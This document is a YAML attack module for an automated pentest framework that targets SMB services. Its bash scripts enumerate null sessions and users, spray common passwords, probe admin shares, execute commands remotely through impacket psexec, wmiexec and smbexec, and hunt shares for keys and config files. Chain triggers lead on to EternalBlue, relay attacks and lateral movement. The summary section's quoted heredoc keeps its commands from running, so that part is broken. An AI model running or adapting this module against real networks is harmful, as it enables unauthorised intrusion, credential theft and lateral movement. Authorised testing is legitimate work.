id: smb_exploitation
name: SMB Service Exploitation
category: Post-Exploitation
priority: high
description: Comprehensive SMB enumeration and exploitation using various techniques
detailed_description: |
  Exploit SMB services for information disclosure, share enumeration, user enumeration,
  vulnerability assessment, and potential remote code execution. Adapts based on
  discovered credentials and SMB version.

# Asset property-based triggers
asset_triggers:
  - asset_type: service
    conditions:
      all:
        - property: service_name
          operator: in_list
          values: ["smb", "microsoft-ds", "netbios-ssn"]
        - property: port
          operator: in_list
          values: [445, 139]
        - property: state
          operator: equals
          value: "open"
        - property: smb_enumerated
          operator: not_equals
          value: true
    priority: 85
    deduplication_key: "{asset.id}:smb_exploit"
    batch_capable: true
    batch_criteria: network_segment

  - asset_type: host
    conditions:
      all:
        - property: smb_services
          operator: greater_than
          value: 0
        - property: valid_credentials
          operator: exists
        - property: smb_post_auth_enum
          operator: not_equals
          value: true
    priority: 90
    deduplication_key: "{asset.id}:smb_auth_exploit:{credentials.hash}"

# Variable extraction
variables:
  target_host:
    source: host_id
    transform: "getHostProperty(host_id, 'ip_address')"

  smb_port:
    source: port
    default: 445

  available_credentials:
    source: valid_credentials
    default: []

  network_hosts:
    source: parent_asset
    transform: "parent_asset.properties.smb_hosts"
    default: []

  output_dir:
    value: "/tmp/smb_enum_{asset.id}_{timestamp}"

# Batch command for multiple SMB hosts
batch_command: |
  #!/bin/bash
  OUTPUT_DIR="{output_dir}"
  mkdir -p "$OUTPUT_DIR"

  echo "[*] Starting SMB exploitation at $(date)" | tee "$OUTPUT_DIR/smb_exploitation.log"

  # SMB host discovery and enumeration
  echo "[+] Phase 1: SMB Host Discovery and Basic Enumeration" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

  for host in {network_hosts}; do
    echo "  [*] Enumerating SMB on $host" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

    # Basic SMB enumeration with enum4linux
    echo "    [+] Running enum4linux..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    timeout 300 enum4linux -a "$host" > "$OUTPUT_DIR/enum4linux_$host.txt" 2>&1

    # Null session enumeration
    echo "    [+] Testing null session..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    smbclient -L "\\\\$host" -N > "$OUTPUT_DIR/null_session_$host.txt" 2>&1

    # Anonymous share enumeration
    echo "    [+] Anonymous share enumeration..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    smbmap -H "$host" > "$OUTPUT_DIR/smbmap_anon_$host.txt" 2>&1

    # SMB vulnerability scanning
    echo "    [+] SMB vulnerability scanning..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    nmap --script smb-vuln* -p 445 "$host" > "$OUTPUT_DIR/smb_vulns_$host.txt" 2>&1

    # EternalBlue check (MS17-010)
    echo "    [+] Checking for EternalBlue..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    nmap --script smb-vuln-ms17-010 -p 445 "$host" > "$OUTPUT_DIR/eternalblue_$host.txt" 2>&1

    # RPC enumeration
    echo "    [+] RPC enumeration..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    rpcclient -U "" -N "$host" -c "enumdomusers; enumdomgroups; querydominfo" > "$OUTPUT_DIR/rpc_enum_$host.txt" 2>&1

    # SMB protocol information
    echo "    [+] SMB protocol info..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    nmap --script smb-protocols,smb-security-mode,smb-os-discovery -p 445 "$host" > "$OUTPUT_DIR/smb_info_$host.txt" 2>&1
  done

  # Authenticated enumeration if credentials available
  if [ -n "{available_credentials}" ]; then
    echo "[+] Phase 2: Authenticated SMB Enumeration" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

    # Parse credentials
    IFS=',' read -ra CREDS <<< "{available_credentials}"
    for cred in "${CREDS[@]}"; do
      username=$(echo "$cred" | cut -d':' -f1)
      password=$(echo "$cred" | cut -d':' -f2)

      echo "  [*] Testing credentials: $username" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

      for host in {network_hosts}; do
        echo "    [+] Authenticated enum on $host with $username" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

        # Authenticated share enumeration
        smbmap -H "$host" -u "$username" -p "$password" > "$OUTPUT_DIR/smbmap_auth_${host}_${username}.txt" 2>&1

        # CrackMapExec enumeration
        crackmapexec smb "$host" -u "$username" -p "$password" --shares --users --groups --local-groups --loggedon-users --rid-brute > "$OUTPUT_DIR/cme_enum_${host}_${username}.txt" 2>&1

        # Share content enumeration
        smbclient -L "\\\\$host" -U "$username%$password" > "$OUTPUT_DIR/shares_${host}_${username}.txt" 2>&1

        # Try to access administrative shares
        echo "      [+] Testing administrative shares..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
        for share in "ADMIN$" "C$" "IPC$"; do
          smbclient "\\\\$host\\$share" -U "$username%$password" -c "ls" > "$OUTPUT_DIR/admin_share_${host}_${share}_${username}.txt" 2>&1
        done

        # Extract domain information
        rpcclient -U "$username%$password" "$host" -c "querydominfo; enumdomusers; enumdomgroups; getdompwinfo" > "$OUTPUT_DIR/domain_info_${host}_${username}.txt" 2>&1

        # Check for writable shares
        echo "      [+] Checking for writable shares..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
        smbclient "\\\\$host\\IPC$" -U "$username%$password" -c "put /etc/hosts test_write.txt" > "$OUTPUT_DIR/write_test_${host}_${username}.txt" 2>&1
      done
    done
  fi

  # Exploitation attempts
  echo "[+] Phase 3: SMB Exploitation Attempts" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

  for host in {network_hosts}; do
    echo "  [*] Exploitation attempts on $host" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

    # Check for EternalBlue exploitation possibility
    if grep -q "VULNERABLE" "$OUTPUT_DIR/eternalblue_$host.txt"; then
      echo "    [!] EternalBlue vulnerability detected on $host" | tee -a "$OUTPUT_DIR/smb_exploitation.log"
      echo "    [!] Manual exploitation required - use ms17_010_eternalblue" | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    fi

    # Check for SMBGhost (CVE-2020-0796)
    echo "    [+] Checking for SMBGhost..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    nmap --script smb-vuln-cve-2020-0796 -p 445 "$host" > "$OUTPUT_DIR/smbghost_$host.txt" 2>&1

    # Password spraying if users discovered
    if [ -f "$OUTPUT_DIR/enum4linux_$host.txt" ] && grep -q "user:" "$OUTPUT_DIR/enum4linux_$host.txt"; then
      echo "    [+] Extracting users for password spraying..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
      grep "user:" "$OUTPUT_DIR/enum4linux_$host.txt" | cut -d'[' -f2 | cut -d']' -f1 > "$OUTPUT_DIR/users_$host.txt"

      # Password spray with common passwords
      echo "    [+] Password spraying..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
      crackmapexec smb "$host" -u "$OUTPUT_DIR/users_$host.txt" -p "password" "Password123" "admin" "123456" > "$OUTPUT_DIR/password_spray_$host.txt" 2>&1
    fi

    # SMB relay attack preparation
    echo "    [+] Checking SMB signing..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    nmap --script smb-security-mode -p 445 "$host" | grep -i signing > "$OUTPUT_DIR/smb_signing_$host.txt"

    if grep -q "disabled\|not required" "$OUTPUT_DIR/smb_signing_$host.txt"; then
      echo "    [!] SMB signing disabled - relay attacks possible" | tee -a "$OUTPUT_DIR/smb_exploitation.log"
    fi
  done

  # Post-exploitation with valid credentials
  if [ -n "{available_credentials}" ]; then
    echo "[+] Phase 4: Post-Exploitation Activities" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

    IFS=',' read -ra CREDS <<< "{available_credentials}"
    for cred in "${CREDS[@]}"; do
      username=$(echo "$cred" | cut -d':' -f1)
      password=$(echo "$cred" | cut -d':' -f2)

      for host in {network_hosts}; do
        # Check if we can execute commands
        echo "    [+] Testing command execution on $host with $username" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

        # Try PSExec-style execution
        impacket-psexec "$username:$password@$host" "whoami" > "$OUTPUT_DIR/psexec_test_${host}_${username}.txt" 2>&1

        # Try WMIExec
        impacket-wmiexec "$username:$password@$host" "whoami" > "$OUTPUT_DIR/wmiexec_test_${host}_${username}.txt" 2>&1

        # Try SMBExec
        impacket-smbexec "$username:$password@$host" "whoami" > "$OUTPUT_DIR/smbexec_test_${host}_${username}.txt" 2>&1

        # Registry enumeration
        echo "    [+] Registry enumeration..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
        impacket-reg "$username:$password@$host" query -keyName "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" > "$OUTPUT_DIR/registry_${host}_${username}.txt" 2>&1

        # Service enumeration
        echo "    [+] Service enumeration..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
        impacket-services "$username:$password@$host" list > "$OUTPUT_DIR/services_${host}_${username}.txt" 2>&1

        # Share file enumeration
        echo "    [+] Detailed share enumeration..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
        for share in $(smbclient -L "\\\\$host" -U "$username%$password" | grep "Disk" | awk '{print $1}'); do
          echo "      [*] Enumerating share: $share" | tee -a "$OUTPUT_DIR/smb_exploitation.log"
          smbclient "\\\\$host\\$share" -U "$username%$password" -c "recurse ON; ls" > "$OUTPUT_DIR/share_content_${host}_${share}_${username}.txt" 2>&1

          # Look for interesting files
          grep -iE "\.(txt|doc|xls|pdf|config|conf|xml|ini|key|pem|p12|pfx)$" "$OUTPUT_DIR/share_content_${host}_${share}_${username}.txt" > "$OUTPUT_DIR/interesting_files_${host}_${share}.txt" 2>&1
        done
      done
    done
  fi

  echo "[*] SMB exploitation completed at $(date)" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

  # Generate summary
  echo "[+] Generating exploitation summary..." | tee -a "$OUTPUT_DIR/smb_exploitation.log"
  cat > "$OUTPUT_DIR/SUMMARY.txt" << 'SUMMARY_EOF'
=== SMB EXPLOITATION SUMMARY ===

VULNERABLE HOSTS:
$(grep -l "VULNERABLE" "$OUTPUT_DIR"/*eternalblue*.txt | xargs -I {} basename {} .txt | sed 's/eternalblue_//' || echo "None found")

HOSTS WITH NULL SESSIONS:
$(grep -l "Anonymous login successful" "$OUTPUT_DIR"/*null_session*.txt | xargs -I {} basename {} .txt | sed 's/null_session_//' || echo "None found")

SUCCESSFUL AUTHENTICATIONS:
$(grep -l "STATUS_SUCCESS" "$OUTPUT_DIR"/*cme*.txt | wc -l || echo "0") successful logins found

WRITABLE SHARES:
$(grep -l "putting file" "$OUTPUT_DIR"/*write_test*.txt | wc -l || echo "0") writable shares found

COMMAND EXECUTION:
$(grep -l "NT AUTHORITY" "$OUTPUT_DIR"/*exec*.txt | wc -l || echo "0") hosts allow command execution

RECOMMENDATION:
$(if [ $(grep -l "VULNERABLE" "$OUTPUT_DIR"/*eternalblue*.txt | wc -l) -gt 0 ]; then echo "CRITICAL: EternalBlue vulnerability found - immediate patching required"; else echo "Review null sessions and weak credentials"; fi)
SUMMARY_EOF

  echo "[*] Results saved to: $OUTPUT_DIR" | tee -a "$OUTPUT_DIR/smb_exploitation.log"

# Individual command for single SMB service
individual_command: |
  #!/bin/bash
  HOST="{target_host}"
  PORT="{smb_port}"
  OUTPUT_DIR="{output_dir}"

  mkdir -p "$OUTPUT_DIR"

  echo "[*] SMB exploitation of $HOST:$PORT at $(date)" | tee "$OUTPUT_DIR/smb_single.log"

  # Basic enumeration
  echo "[+] Basic SMB enumeration..."
  enum4linux -a "$HOST" > "$OUTPUT_DIR/enum4linux.txt" 2>&1
  smbclient -L "\\\\$HOST" -N > "$OUTPUT_DIR/null_session.txt" 2>&1
  smbmap -H "$HOST" > "$OUTPUT_DIR/smbmap.txt" 2>&1

  # Vulnerability assessment
  echo "[+] SMB vulnerability assessment..."
  nmap --script smb-vuln* -p "$PORT" "$HOST" > "$OUTPUT_DIR/vulns.txt" 2>&1

  # Authenticated enumeration if credentials available
  if [ -n "{available_credentials}" ]; then
    echo "[+] Authenticated enumeration..."
    cred="{available_credentials}"
    username=$(echo "$cred" | cut -d':' -f1)
    password=$(echo "$cred" | cut -d':' -f2)

    smbmap -H "$HOST" -u "$username" -p "$password" > "$OUTPUT_DIR/auth_enum.txt" 2>&1
    crackmapexec smb "$HOST" -u "$username" -p "$password" --shares > "$OUTPUT_DIR/cme_auth.txt" 2>&1
  fi

# Expected property updates
property_updates:
  on_success:
    - property: smb_enumerated
      operation: set
      value: true

    - property: smb_vulnerabilities
      operation: set
      value: "{discovered_vulnerabilities}"

    - property: smb_shares
      operation: set
      value: "{discovered_shares}"

    - property: smb_users
      operation: set
      value: "{discovered_users}"

    - property: smb_signing_disabled
      operation: set
      value: "{signing_disabled}"

    - property: null_session_allowed
      operation: set
      value: "{null_session_success}"

    - property: command_execution_possible
      operation: set
      value: "{can_execute_commands}"

# Expected discoveries
expected_discoveries:
  - asset_type: vulnerability
    conditions:
      - severity: ["critical", "high"]
    properties:
      cve: "{cve_id}"
      name: "{vulnerability_name}"
      severity: "{severity}"
      affected_service: "smb"
      exploitable: true

  - asset_type: credential
    conditions:
      - discovered_via: "password_spray"
    properties:
      username: "{username}"
      password: "{password}"
      service: "smb"
      source: "smb_exploitation"

# Chain triggers
chain_triggers:
  on_success:
    - condition:
        property: smb_vulnerabilities
        operator: contains
        value: "ms17-010"
      trigger: eternalblue_exploitation

    - condition:
        property: command_execution_possible
        operator: equals
        value: true
      trigger: windows_post_exploitation

    - condition:
        property: smb_signing_disabled
        operator: equals
        value: true
      trigger: smb_relay_attack

    - condition:
        property: smb_shares
        operator: contains
        match:
          writable: true
      trigger: lateral_movement_via_smb

# Outcome analysis
outcome_analysis:
  success_indicators:
    - SMB services enumerated
    - Shares discovered and accessed
    - Vulnerabilities identified
    - Command execution achieved

  failure_indicators:
    - SMB access denied
    - All shares protected
    - No vulnerabilities found
    - Strong SMB configuration

# Cleanup
cleanup:
  - priority: medium
    action: Remove uploaded test files
    command: |
      for host in {network_hosts}; do
        smbclient "\\\\$host\\IPC$" -N -c "del test_write.txt" 2>/dev/null
      done

  - priority: low
    action: Clear temporary files
    command: rm -rf {output_dir}/users_*.txt